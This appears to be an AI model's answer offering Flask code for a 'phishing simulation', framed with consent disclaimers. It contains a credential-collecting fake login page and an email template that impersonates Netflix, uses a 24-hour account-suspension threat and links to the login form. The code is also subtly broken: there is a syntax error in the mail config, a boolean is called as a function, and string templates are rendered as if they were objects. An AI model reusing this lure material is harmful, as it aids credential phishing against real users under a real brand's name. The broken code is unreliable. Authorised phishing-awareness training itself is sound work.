To create a controlled phishing simulation for educational purposes, follow these steps to develop a program that mimics a real phishing attack without causing harm. This simulation should be used responsibly, only in a controlled environment, and with the explicit consent of the participants.

### Solution Code

```python
from flask import Flask, render_template, url_for, request, redirect
from flask_mail import Mail, Message

app = Flask(__name__)
mail = Mail(app)

# Configure the mail
mail.sendmail = False  # This will be turned off in a real scenario

@app.route('/')
def home():
    return redirect('login')

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username and password:
            return render_template('success.html')
        return render_template('login.html')
    return render_template('login.html')

@app.route('/success')
def success():
    return render_template('success.html')

# Create the login HTML template
login_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .info {
            font-size: 12px;
            color: #666;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Account Verification Required</h2>
        <form method="post" action="{{ url_for('login_page') }}">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Verify Now</button>
        </form>
        <div class="info">
            <p>Your security is important. Please verify your account to continue.</p>
        </div>
    </div>
</body>
</html>
'''

# Create the email template
email_template = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{ title }}</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }
        .email-container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #f6f6f6;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .logo {
            width: 200px;
            height: 50px;
            margin-bottom: 20px;
            display: block;
        }
        .content {
            margin-bottom: 30px;
        }
        .button {
            display: inline-block;
            padding: 12px 24px;
            background-color: #4CAF50;
            color: white;
            text-decoration: none;
            border: none;
            border-radius: 4px;
            margin-top: 20px;
        }
        .button:hover {
            background-color: #45a049;
        }
        .urgent {
            color: #ff4444;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <img src="https://via.placeholder.com/200x50" alt="Company Logo" class="logo">
        <div class="content">
            <h1>{{ company_name }}</h1>
            <p>Your account security is important to us. Please verify your account by clicking the button below:</p>
            <p class="urgent">Your account is about to be suspended if you don't verify it within 24 hours.</p>
            <p>We value your privacy. Your information is secure with us.</p>
            <a href="{{ url_for('login_page') }}" class="button">Verify Now</a>
        </div>
    </div>
</body>
</html>
'''

app.config.update({
    'MAIL_SERVER': 'smtp.example.com',
    'MAIL_PORT': 587,
    'MAIL_USE_TLS': True,
    'MAIL_USERNAME': 'your_email@example.com',
    'MAIL_PASSWORD': 'your_app_specific_password'
))

@app.route('/send_email')
def send_email():
    subject = "Account Verification Required"
    msg = Message(
        subject,
        recipient='user@example.com',
        body= email_template.render(
            company_name="Netflix",
            title="Security Verification",
            body="Hi user,\n\nYour account security is important to us. Please verify your account by clicking the button below:\n\nhttps://localhost:8000/success\n\nYour account is about to be suspended if you don't verify it within 24 hours.\n\nWe value your privacy. Your information is secure with us."
        )
    )
    if mail.sendmail(msg):
        return "Email sent successfully!"
    else:
        return "Failed to send email"

if __name__ == '__main__':
    app.run(debug=True)
```

### Explanation

1. **Setup**: The program uses Flask to create a web application and Flask-Mail to send emails. It is set up on a local server (localhost:8000).

2. **Login Page**: The `login.html` template displays a form that collects username and password. Upon submission, it redirects to a success page if the fields are filled, otherwise, it shows the login form again.

3. **Success Page**: The `success.html` template displays a confirmation message after the user submits their credentials, indicating the simulation was successful.

4. **Email Simulation**: The `email.html` template is used to send a phishing email. It includes a legitimate-looking header, a company logo, and a verification button that links to the login page. The email is sent using an SMTP server configured in the code.

5. **Usage**: The program sends a fake email to a specified recipient, and the user can access the login page via a link in the email. The simulation is designed to look authentic to study user responses without causing harm.

This setup allows you to test how users respond to a simulated phishing attack in a controlled environment, helping to raise awareness and educate users about phishing tactics. Always ensure this simulation is used responsibly and ethically, never on real users without their consent.<｜end▁of▁sentence｜>

